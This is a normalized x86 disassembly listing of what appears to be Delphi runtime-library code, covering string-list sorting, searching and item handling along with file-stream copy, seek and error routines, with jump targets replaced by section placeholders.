mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
sub_41493c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4149dd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149e4
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_4149c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
sub_4149ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414a24
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ac8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4175dc
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor eax eax
push ebp
push sub_414aa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416678
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41827c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414aaa
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
sub_414ad4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4158a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b26
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_414b2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404250
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b80
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_414b8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4055e4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_414bc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404188
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c0a
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_414c10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414cc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4141fc
xor edx edx
push ebp
push sub_414ca7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cae
mov eax [ ebp - 0x4 ]
call sub_4142b8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404080
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_414cd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414d4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_418e28
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_418e30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d51
lea eax [ ebp - 0xc ]
call sub_403f90
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418ed0
inc esi
dec ebx
jne r-xdata
sub_414d7c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_414d98
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414034
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a0c
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_414e00
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4143b0
jmp r-xdata
sub_414e9c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a0c
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_414edc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404af8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_414f48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4143b0
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_414fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_414fa4
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_414fc8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415040
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fe4
pop edi
pop esi
pop ebx
retn
sub_41507c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_4150a4
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4150d8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414678
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415124
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4143b0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415178
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_4150a4
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fe4
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_4151f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4143b0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fe4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41524c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4143b0
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41528c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414fa4
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41528c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41533c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415398
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41528c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4153ec
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415420
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415484
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_4154d8
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
mov esp ebp
pop ebp
retn
sub_415524
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031a0
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4154d8
pop ecx
mov eax [ ebx ]
call sub_4031e4
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4154d8
pop ecx
sub_4155a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415618
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_415650
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_415688
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41540c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415764
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41576b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415618
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415650
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41577c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e00
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4157cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_417e34
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157d3
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_4157dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_415838
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408194
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415878
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c6a4
pop ebx
pop ebp
retn 0x8
sub_4158a0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_4158e4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4158e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415a0d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403564
movzx edx di
mov eax esi
call sub_4080b8
mov ecx eax
xor edx edx
mov eax ebx
call sub_4157dc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408134
mov ecx eax
xor edx edx
mov eax ebx
call sub_4157dc
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a14
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fb4
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40828c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aa7c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40828c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aa7c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
jmp r-xdata
sub_415a14
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
